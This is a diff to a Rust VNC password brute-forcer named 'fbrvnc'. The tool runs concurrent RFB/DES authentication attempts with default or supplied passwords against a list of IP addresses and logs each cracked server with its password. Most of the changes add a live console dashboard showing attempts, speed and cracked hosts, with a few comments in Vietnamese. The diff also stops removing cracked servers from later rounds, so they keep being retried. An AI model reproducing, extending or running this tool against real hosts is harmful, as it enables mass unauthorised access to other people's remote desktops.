@@ -1,10 +1,10 @@
-
+use std::collections::VecDeque;
 use std::fs::{File, OpenOptions};
 use std::io::{self, BufRead, BufReader, Write};
 use std::net::SocketAddr;
 use std::path::{Path, PathBuf};
-use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
-use std::sync::{Arc, Mutex, RwLock};
+use std::sync::atomic::{AtomicBool, Ordering};
+use std::sync::{Arc, Mutex};
 use std::time::{Duration, Instant};
 
 use des::cipher::generic_array::GenericArray;
@@ -29,6 +29,107 @@ const DEFAULT_PORT:         u16  = 5900;
 
 const DEFAULT_PASSWORDS: &[&str] = &["123456", "1234", "abc", "admin"];
 
+const DASH_W: i16 = 100;
+const DASH_H: i16 = 42;
+const RECENT_HITS_LIMIT: usize = 20;
+const PARTIAL_TICK_MS:   u64   = 300;  // 0.3s — realtime
+const FULL_TICK_SECS:    u64   = 6;    // 6s   — dọn rác / sửa dashboard
+
+// ============================================================================
+// Console abstraction (no ANSI on Windows – works on Server 2012 / older)
+// ============================================================================
+
+#[cfg(windows)]
+mod con {
+    use std::ffi::c_void;
+
+    #[repr(C)]
+    #[derive(Clone, Copy)]
+    struct Coord { x: i16, y: i16 }
+
+    #[repr(C)]
+    #[derive(Clone, Copy)]
+    struct SmallRect { left: i16, top: i16, right: i16, bottom: i16 }
+
+    #[repr(C)]
+    #[derive(Clone, Copy)]
+    struct ConsoleScreenBufferInfo {
+        size: Coord,
+        cursor: Coord,
+        attributes: u16,
+        window: SmallRect,
+        max_window_size: Coord,
+    }
+
+    #[link(name = "kernel32")]
+    extern "system" {
+        fn GetStdHandle(n: u32) -> *mut c_void;
+        fn SetConsoleCursorPosition(h: *mut c_void, p: Coord) -> i32;
+        fn SetConsoleScreenBufferSize(h: *mut c_void, s: Coord) -> i32;
+        fn SetConsoleWindowInfo(h: *mut c_void, a: i32, r: *const SmallRect) -> i32;
+        fn GetConsoleScreenBufferInfo(h: *mut c_void, i: *mut ConsoleScreenBufferInfo) -> i32;
+        fn FillConsoleOutputCharacterA(h: *mut c_void, c: i8, n: u32, p: Coord, w: *mut u32) -> i32;
+        fn SetConsoleTitleA(t: *const i8) -> i32;
+    }
+
+    const STD_OUTPUT_HANDLE: u32 = 0xFFFF_FFF5;
+
+    pub fn clear() {
+        unsafe {
+            let h = GetStdHandle(STD_OUTPUT_HANDLE);
+            let mut info: ConsoleScreenBufferInfo = std::mem::zeroed();
+            if GetConsoleScreenBufferInfo(h, &mut info) == 0 { return; }
+            let cells = (info.size.x.max(0) as u32) * (info.size.y.max(0) as u32);
+            let mut written = 0u32;
+            FillConsoleOutputCharacterA(h, b' ' as i8, cells, Coord { x: 0, y: 0 }, &mut written);
+            SetConsoleCursorPosition(h, Coord { x: 0, y: 0 });
+        }
+    }
+
+    pub fn home() {
+        unsafe {
+            let h = GetStdHandle(STD_OUTPUT_HANDLE);
+            SetConsoleCursorPosition(h, Coord { x: 0, y: 0 });
+        }
+    }
+
+    pub fn resize(w: i16, h: i16) {
+        unsafe {
+            let hd = GetStdHandle(STD_OUTPUT_HANDLE);
+            let mut info: ConsoleScreenBufferInfo = std::mem::zeroed();
+            if GetConsoleScreenBufferInfo(hd, &mut info) == 0 { return; }
+
+            let cur_w = info.window.right - info.window.left + 1;
+            let cur_h = info.window.bottom - info.window.top + 1;
+            if w < cur_w || h < cur_h {
+                let tiny = SmallRect { left: 0, top: 0, right: 0, bottom: 0 };
+                if SetConsoleWindowInfo(hd, 1, &tiny) == 0 { return; }
+            }
+            if SetConsoleScreenBufferSize(hd, Coord { x: w, y: h }) == 0 { return; }
+            let full = SmallRect { left: 0, top: 0, right: w - 1, bottom: h - 1 };
+            SetConsoleWindowInfo(hd, 1, &full);
+        }
+    }
+
+    pub fn set_title(t: &str) {
+        if let Ok(c) = std::ffi::CString::new(t) {
+            unsafe { SetConsoleTitleA(c.as_ptr()); }
+        }
+    }
+}
+
+#[cfg(not(windows))]
+mod con {
+    use std::io::{self, Write};
+    pub fn clear() {
+        print!("\x1B[2J\x1B[H");
+        io::stdout().flush().ok();
+    }
+    pub fn home() { print!("\x1B[H"); }
+    pub fn resize(_w: i16, _h: i16) {}
+    pub fn set_title(_t: &str) {}
+}
+
 // ============================================================================
 // CLI
 // ============================================================================
@@ -48,7 +149,6 @@ impl Cli {
             timeout:        DEFAULT_TIMEOUT,
             threads:        DEFAULT_THREADS,
         };
-
         let mut it = std::env::args().skip(1);
         while let Some(arg) = it.next() {
             match arg.as_str() {
@@ -64,22 +164,15 @@ impl Cli {
                     let v = it.next().ok_or("missing value for -t/--timeout")?;
                     cli.timeout = v.parse::<f64>()
                         .map_err(|_| format!("invalid timeout: {}", v))?;
-                    if cli.timeout <= 0.0 {
-                        return Err("timeout must be > 0".into());
-                    }
+                    if cli.timeout <= 0.0 { return Err("timeout must be > 0".into()); }
                 }
                 "-th" | "--threads" => {
                     let v = it.next().ok_or("missing value for -th/--threads")?;
                     cli.threads = v.parse::<usize>()
                         .map_err(|_| format!("invalid threads: {}", v))?;
-                    if cli.threads == 0 {
-                        return Err("threads must be > 0".into());
-                    }
+                    if cli.threads == 0 { return Err("threads must be > 0".into()); }
                 }
-                "-h" | "--help" => {
-                    print_usage();
-                    std::process::exit(0);
-                }
+                "-h" | "--help" => { print_usage(); std::process::exit(0); }
                 other => return Err(format!("unknown argument: {}", other)),
             }
         }
@@ -101,15 +194,8 @@ fn print_usage() {
     println!();
     println!("IP file format (one per line):");
     println!("    <ip>            use default port {}", DEFAULT_PORT);
-    println!("    <ip>:<port>     explicit port");
+    println!("    <ip>:<port>     explicit port (port 0 -> default {})", DEFAULT_PORT);
     println!("  Lines starting with '#' are ignored.");
-    println!();
-    println!("Default passwords (used when -p is not supplied):");
-    for pw in DEFAULT_PASSWORDS {
-        println!("    {}", pw);
-    }
-    println!();
-    println!("Results are written to \"{}\" in the current directory.", DEFAULT_RESULTS_FILE);
 }
 
 // ============================================================================
@@ -117,10 +203,7 @@ fn print_usage() {
 // ============================================================================
 
 #[derive(Clone, PartialEq, Eq, Debug)]
-struct Server {
-    ip:   String,
-    port: u16,
-}
+struct Server { ip: String, port: u16 }
 
 fn is_ip(s: &str) -> bool {
     let parts: Vec<&str> = s.split('.').collect();
@@ -142,6 +225,8 @@ fn load_servers(path: &Path, default_port: u16) -> io::Result<Vec<Server>> {
             let parts: Vec<&str> = line.split(':').collect();
             if parts.len() == 2 && is_ip(parts[0]) {
                 if let Ok(port) = parts[1].parse::<u16>() {
+                    // <-- ip:0 => default port
+                    let port = if port == 0 { default_port } else { port };
                     out.push(Server { ip: parts[0].into(), port });
                 }
             }
@@ -163,7 +248,7 @@ fn default_passwords() -> Vec<String> {
 }
 
 // ============================================================================
-// DES (VNC legacy: 8-byte key, bit-reversed)
+// DES (VNC legacy auth)
 // ============================================================================
 
 fn make_cipher(password: &str) -> Des {
@@ -180,16 +265,10 @@ fn make_cipher(password: &str) -> Des {
 // RFB auth
 // ============================================================================
 
-struct RfbResult {
-    null: bool,
-    name: String,
-}
+struct RfbResult { null: bool, name: String }
 
 async fn rfb_attempt(
-    host: &str,
-    port: u16,
-    cipher: &Des,
-    timeout: Duration,
+    host: &str, port: u16, cipher: &Des, timeout: Duration,
 ) -> Option<RfbResult> {
     let sa = format!("{}:{}", host, port).parse::<SocketAddr>().ok()?;
     let mut s = tokio::time::timeout(timeout, TcpStream::connect(sa)).await.ok()?.ok()?;
@@ -245,12 +324,10 @@ async fn read_server_name(s: &mut TcpStream, timeout: Duration) -> Option<String
 }
 
 // ============================================================================
-// Result writer (unbuffered)
+// Result writer
 // ============================================================================
 
-struct ResultWriter {
-    file: Mutex<File>,
-}
+struct ResultWriter { file: Mutex<File> }
 
 impl ResultWriter {
     fn open(path: &Path) -> io::Result<Self> {
@@ -258,7 +335,6 @@ impl ResultWriter {
             .create(true).write(true).truncate(true).open(path)?;
         Ok(Self { file: Mutex::new(file) })
     }
-
     fn write_line(&self, line: &str) {
         let mut f = match self.file.lock() {
             Ok(g)  => g,
@@ -271,25 +347,218 @@ impl ResultWriter {
 }
 
 // ============================================================================
-// Console output helpers
+// Config + Dashboard state
 // ============================================================================
 
-fn print_hit(idx: u64, body: &str) {
-    print!("\r\x1B[2K[{}] {}\n", idx, body);
-    io::stdout().flush().ok();
+#[derive(Clone)]
+struct Config {
+    threads:      usize,
+    timeout:      f64,
+    results_file: String,
 }
 
-fn draw_progress(done: usize, total: usize, password: &str, cracked: u64) {
-    print!(
-        "\r\x1B[2K[*] progress: {}/{}  password=\"{}\"  cracked={}",
-        done, total, password, cracked
+#[derive(Clone)]
+struct StateInner {
+    total_servers:     usize,
+    remaining_servers: usize,
+    current_pw:        String,
+    password_idx:      usize,
+    password_count:    usize,
+    attempts:          u64,
+    start:             Instant,
+    finish_time:       Option<Duration>,
+    results:           VecDeque<String>,
+    finished:          bool,
+}
+
+impl StateInner {
+    fn new() -> Self {
+        Self {
+            total_servers: 0,
+            remaining_servers: 0,
+            current_pw: String::new(),
+            password_idx: 0,
+            password_count: 0,
+            attempts: 0,
+            start: Instant::now(),
+            finish_time: None,
+            results: VecDeque::with_capacity(RECENT_HITS_LIMIT),
+            finished: false,
+        }
+    }
+    fn elapsed(&self) -> Duration {
+        self.finish_time.unwrap_or_else(|| self.start.elapsed())
+    }
+    fn cracked(&self) -> u64 {
+        self.total_servers.saturating_sub(self.remaining_servers) as u64
+    }
+}
+
+struct SharedState {
+    inner: Mutex<StateInner>,
+}
+
+impl SharedState {
+    fn new() -> Self {
+        Self { inner: Mutex::new(StateInner::new()) }
+    }
+}
+
+fn fmt_duration(secs: u64) -> String {
+    format!("{:02}:{:02}:{:02}", secs / 3600, (secs % 3600) / 60, secs % 60)
+}
+
+// ---- dashboard build -------------------------------------------------------
+
+fn pad_to(s: &str, w: usize) -> String {
+    let n = s.chars().count();
+    if n >= w {
+        s.chars().take(w).collect()
+    } else {
+        let mut r = String::with_capacity(w);
+        r.push_str(s);
+        r.push_str(&" ".repeat(w - n));
+        r
+    }
+}
+
+// Build 15 dòng dashboard, mỗi dòng pad DASH_W
+fn dashboard_lines(s: &StateInner, cfg: &Config) -> Vec<String> {
+    let w = DASH_W as usize;
+    let elapsed = s.elapsed();
+    let secs    = elapsed.as_secs();
+    let speed   = if elapsed.as_secs_f64() > 0.0 {
+        s.attempts as f64 / elapsed.as_secs_f64()
+    } else { 0.0 };
+
+    let total_est = (s.total_servers as u64).saturating_mul(s.password_count as u64);
+    let progress_pct = if s.finished {
+        100.0
+    } else if total_est > 0 {
+        ((s.attempts as f64 / total_est as f64) * 100.0).min(99.99)
+    } else { 0.0 };
+
+    let pw_left = if s.password_count == 0 {
+        0usize
+    } else {
+        s.password_count.saturating_sub(s.password_idx) + 1
+    };
+    let eta_attempts = (s.remaining_servers as u64).saturating_mul(pw_left as u64);
+    let eta_secs = if speed > 0.0 { (eta_attempts as f64 / speed) as u64 } else { 0 };
+
+    let pw_disp = if s.finished { s.password_count } else { s.password_idx };
+    let bar_w   = 24usize;
+    let filled  = ((progress_pct / 100.0) * bar_w as f64).round() as usize;
+    let bar = format!(
+        "{}{}",
+        "=".repeat(filled.min(bar_w)),
+        " ".repeat(bar_w.saturating_sub(filled))
     );
-    io::stdout().flush().ok();
+
+    let sep  = "=".repeat(w);
+    let dash = "-".repeat(w);
+
+    let mut v = Vec::with_capacity(15);
+    v.push(sep.clone());
+    v.push(pad_to(&format!(" fbrvnc {} - VNC Brute", VERSION), w));
+    v.push(sep);
+    v.push(pad_to(&format!(" Status     : {}",
+        if s.finished { "FINISHED" } else { "RUNNING" }), w));
+    v.push(pad_to(&format!(" Servers    : {} total, {} cracked, {} remaining",
+        s.total_servers, s.cracked(), s.remaining_servers), w));
+    v.push(pad_to(&format!(" Password   : \"{}\"  [{}/{}]",
+        s.current_pw, pw_disp, s.password_count), w));
+    v.push(pad_to(&format!(" Progress   : [{}] {:.2}%", bar, progress_pct), w));
+    v.push(pad_to(&format!(" Attempts   : {}", s.attempts), w));
+    v.push(pad_to(&format!(" Speed      : {:.1} attempts/s", speed), w));
+    v.push(pad_to(&format!(" Elapsed    : {}", fmt_duration(secs)), w));
+    v.push(pad_to(&format!(" ETA        : {}", fmt_duration(eta_secs)), w));
+    v.push(pad_to(&format!(" Threads    : {}", cfg.threads), w));
+    v.push(pad_to(&format!(" Timeout    : {:.1}s", cfg.timeout), w));
+    v.push(pad_to(&format!(" Results    : {}", cfg.results_file), w));
+    v.push(dash);
+    v
 }
 
-fn clear_progress_line() {
-    print!("\r\x1B[2K");
-    io::stdout().flush().ok();
+// 20 hits gần nhất (mới nhất ở dưới cùng) + dòng đóng
+fn hits_lines(s: &StateInner) -> Vec<String> {
+    let w = DASH_W as usize;
+    let mut v = Vec::with_capacity(RECENT_HITS_LIMIT + 1);
+    let mut shown = 0usize;
+    for line in s.results.iter().take(RECENT_HITS_LIMIT) {
+        v.push(pad_to(&format!(" {}", line), w));
+        shown += 1;
+    }
+    for _ in shown..RECENT_HITS_LIMIT {
+        v.push(pad_to("", w));
+    }
+    v.push("=".repeat(w));
+    v
+}
+
+fn emit_lines(lines: &[String]) {
+    let stdout = io::stdout();
+    let mut lock = stdout.lock();
+    for l in lines {
+        lock.write_all(l.as_bytes()).ok();
+        lock.write_all(b"\r\n").ok();
+    }
+    lock.flush().ok();
+}
+
+// 6s / finish: xoá sạch buffer rồi vẽ lại — chống "hư dashboard"
+fn render_full(s: &StateInner, cfg: &Config) {
+    con::clear();
+    let mut all = dashboard_lines(s, cfg);
+    all.extend(hits_lines(s));
+    emit_lines(&all);
+}
+
+// 0.3s: chỉ home cursor rồi ghi đè (dòng đã pad cứng → không để lại rác)
+fn render_partial(s: &StateInner, cfg: &Config) {
+    con::home();
+    let mut all = dashboard_lines(s, cfg);
+    all.extend(hits_lines(s));
+    emit_lines(&all);
+}
+
+// ============================================================================
+// Render loop: 0.3s partial, 6s full
+// ============================================================================
+
+async fn render_loop(
+    shared:   Arc<SharedState>,
+    cfg:      Arc<Config>,
+    shutdown: Arc<AtomicBool>,
+) {
+    {
+        let st = shared.inner.lock().unwrap().clone();
+        render_full(&st, &cfg);
+    }
+    let mut last_full = Instant::now();
+
+    let mut tick = tokio::time::interval(Duration::from_millis(PARTIAL_TICK_MS));
+    tick.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);
+    tick.tick().await;
+
+    loop {
+        tick.tick().await;
+
+        let is_shutdown = shutdown.load(Ordering::Relaxed);
+        let st = shared.inner.lock().unwrap().clone();
+
+        let need_full = is_shutdown
+            || last_full.elapsed() >= Duration::from_secs(FULL_TICK_SECS);
+
+        if need_full {
+            render_full(&st, &cfg);
+            last_full = Instant::now();
+        } else {
+            render_partial(&st, &cfg); // realtime cả dashboard + 20 hits
+        }
+
+        if is_shutdown { break; }
+    }
 }
 
 // ============================================================================
@@ -297,108 +566,88 @@ fn clear_progress_line() {
 // ============================================================================
 
 async fn run_brute(
-    servers:     Vec<Server>,
-    passwords:   Vec<String>,
-    writer:      Arc<ResultWriter>,
-    threads:     usize,
-    timeout_sec: f64,
+    servers:   Vec<Server>,
+    passwords: Vec<String>,
+    writer:    Arc<ResultWriter>,
+    shared:    Arc<SharedState>,
+    cfg:       Arc<Config>,
 ) -> io::Result<()> {
     let total_servers = servers.len();
-    let timeout       = Duration::from_secs_f64(timeout_sec);
-    let workers       = threads.max(1);
+    let timeout       = Duration::from_secs_f64(cfg.timeout);
+    let workers       = cfg.threads.max(1);
 
-    let servers_mu = Arc::new(AsyncMutex::new(servers));
-    let current_pw = Arc::new(RwLock::new(String::new()));
-    let shutdown   = Arc::new(AtomicBool::new(false));
-    let found_cnt  = Arc::new(AtomicU64::new(0));
-    let start_time = Instant::now();
-
-    // Progress reporter
+    // init state BEFORE spawning render loop
     {
-        let cp   = current_pw.clone();
-        let sm   = servers_mu.clone();
-        let kill = shutdown.clone();
-        let fc   = found_cnt.clone();
-        let tot  = total_servers;
-
-        tokio::spawn(async move {
-            let mut tick = tokio::time::interval(Duration::from_millis(250));
-            tick.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);
-            loop {
-                tick.tick().await;
-                if kill.load(Ordering::Relaxed) { break; }
-
-                let pw        = cp.read().unwrap().clone();
-                let remaining = sm.lock().await.len();
-                let found     = fc.load(Ordering::Relaxed);
-                let done      = tot.saturating_sub(remaining);
-
-                if !pw.is_empty() {
-                    draw_progress(done, tot, &pw, found);
-                }
-            }
-        });
+        let mut s = shared.inner.lock().unwrap();
+        s.total_servers     = total_servers;
+        s.remaining_servers = total_servers;
+        s.password_count    = passwords.len();
+        s.start             = Instant::now();
     }
 
-    for password in &passwords {
-        *current_pw.write().unwrap() = password.clone();
+    let shutdown      = Arc::new(AtomicBool::new(false));
+    let render_handle = tokio::spawn(render_loop(shared.clone(), cfg.clone(), shutdown.clone()));
+
+    let servers_mu = Arc::new(AsyncMutex::new(servers));
+
+    for (pw_idx, password) in passwords.iter().enumerate() {
+        {
+            let mut s = shared.inner.lock().unwrap();
+            s.current_pw   = password.clone();
+            s.password_idx = pw_idx + 1;
+        }
 
         let snapshot: Vec<Server> = servers_mu.lock().await.clone();
         if snapshot.is_empty() { break; }
 
-        let cipher  = Arc::new(make_cipher(password));
-        let cracked = Arc::new(AsyncMutex::new(Vec::<Server>::new()));
+        let cipher = Arc::new(make_cipher(password));
 
         stream::iter(snapshot)
             .for_each_concurrent(workers, |srv| {
-                let cipher  = cipher.clone();
-                let writer  = writer.clone();
-                let cracked = cracked.clone();
-                let pw      = password.clone();
-                let fc      = found_cnt.clone();
+                let cipher = cipher.clone();
+                let writer = writer.clone();
+                let shared = shared.clone();
+                let pw     = password.clone();
 
                 async move {
-                    if let Some(res) =
-                        rfb_attempt(&srv.ip, srv.port, &cipher, timeout).await
-                    {
-                        let pw_str = if res.null { "null".to_string() } else { pw };
+                    let res = rfb_attempt(&srv.ip, srv.port, &cipher, timeout).await;
 
-                        let file_line = format!(
+                    // count every attempt
+                    {
+                        let mut s = shared.inner.lock().unwrap();
+                        s.attempts = s.attempts.wrapping_add(1);
+                    }
+
+                    if let Some(res) = res {
+                        let pw_str = if res.null { "null".to_string() } else { pw };
+                        let line = format!(
                             "{}:{}-{}-[{}]",
                             srv.ip, srv.port, pw_str, res.name
                         );
-                        writer.write_line(&file_line);
+                        writer.write_line(&line);
 
-                        let idx = fc.fetch_add(1, Ordering::Relaxed) + 1;
-                        print_hit(idx, &file_line);
-
-                        cracked.lock().await.push(srv);
+                        {
+                            let mut s = shared.inner.lock().unwrap();
+                            s.remaining_servers = s.remaining_servers.saturating_sub(1);
+                            s.results.push_back(line);
+                            while s.results.len() > RECENT_HITS_LIMIT {
+                                s.results.pop_front();
+                            }
+                        }
                     }
                 }
             })
             .await;
-
-        let cracked = std::mem::take(&mut *cracked.lock().await);
-        if !cracked.is_empty() {
-            let mut sv = servers_mu.lock().await;
-            sv.retain(|s| !cracked.iter().any(|c| c.ip == s.ip && c.port == s.port));
-        }
     }
 
+    // finished
+    {
+        let mut s = shared.inner.lock().unwrap();
+        s.finished = true;
+        s.finish_time = Some(s.start.elapsed());
+    }
     shutdown.store(true, Ordering::Relaxed);
-    tokio::time::sleep(Duration::from_millis(400)).await;
-    clear_progress_line();
-
-    let elapsed   = start_time.elapsed();
-    let found     = found_cnt.load(Ordering::Relaxed);
-    let remaining = servers_mu.lock().await.len();
-
-    println!();
-    println!("BRUTE COMPLETE");
-    println!("  elapsed:       {:.2}s", elapsed.as_secs_f64());
-    println!("  cracked:       {} / {}", found, total_servers);
-    println!("  uncracked:     {}", remaining);
-    println!("  results file:  {}", DEFAULT_RESULTS_FILE);
+    render_handle.await.ok();
 
     Ok(())
 }
@@ -409,7 +658,7 @@ async fn run_brute(
 
 fn main() {
     let cli = match Cli::parse() {
-        Ok(c) => c,
+        Ok(c)  => c,
         Err(e) => {
             eprintln!("error: {}", e);
             eprintln!();
@@ -419,7 +668,7 @@ fn main() {
     };
 
     let servers = match load_servers(&cli.ips_file, DEFAULT_PORT) {
-        Ok(s) => s,
+        Ok(s)  => s,
         Err(e) => { eprintln!("error: cannot load servers: {}", e); std::process::exit(1); }
     };
     if servers.is_empty() {
@@ -427,10 +676,10 @@ fn main() {
         std::process::exit(1);
     }
 
-    let (passwords, pw_source) = match &cli.passwords_file {
+    let (passwords, _pw_source) = match &cli.passwords_file {
         Some(p) => {
             let list = match load_passwords(p) {
-                Ok(v) => v,
+                Ok(v)  => v,
                 Err(e) => { eprintln!("error: cannot load password file: {}", e); std::process::exit(1); }
             };
             if list.is_empty() {
@@ -442,26 +691,24 @@ fn main() {
         None => (default_passwords(), "built-in default".to_string()),
     };
 
-    // ---- banner (gọn) ----
-    println!();
-    println!("=================");
-    println!("  fbrvnc {}", VERSION);
-    println!("=================");
-    println!("  ips_file:     {} ({} servers)", cli.ips_file.display(), servers.len());
-    println!("  passwords:    {} ({} entries)", pw_source, passwords.len());
-    println!("  threads:      {}", cli.threads);
-    println!("  timeout:      {:.1}s", cli.timeout);
-    println!("  output_file:  {}", DEFAULT_RESULTS_FILE);
-    println!("=================");
-    println!();
+    // Console prep
+    con::set_title(&format!("fbrvnc {} - VNC Brute", VERSION));
+    con::resize(DASH_W, DASH_H);
 
     let writer = match ResultWriter::open(Path::new(DEFAULT_RESULTS_FILE)) {
-        Ok(w) => Arc::new(w),
+        Ok(w)  => Arc::new(w),
         Err(e) => {
             eprintln!("error: cannot open \"{}\": {}", DEFAULT_RESULTS_FILE, e);
             std::process::exit(1);
         }
     };
+
+    let shared = Arc::new(SharedState::new());
+    let cfg    = Arc::new(Config {
+        threads:      cli.threads,
+        timeout:      cli.timeout,
+        results_file: DEFAULT_RESULTS_FILE.to_string(),
+    });
 
     let rt = tokio::runtime::Builder::new_multi_thread()
         .enable_all()
@@ -469,9 +716,15 @@ fn main() {
         .expect("failed to create tokio runtime");
 
     if let Err(e) = rt.block_on(run_brute(
-        servers, passwords, writer, cli.threads, cli.timeout,
+        servers, passwords, writer, shared, cfg,
     )) {
         eprintln!("[!] error: {}", e);
         std::process::exit(1);
     }
+
+    // leave the finished dashboard on screen
+    println!();
+    println!("Press Enter to exit...");
+    let mut _buf = String::new();
+    io::stdin().read_line(&mut _buf).ok();
 }
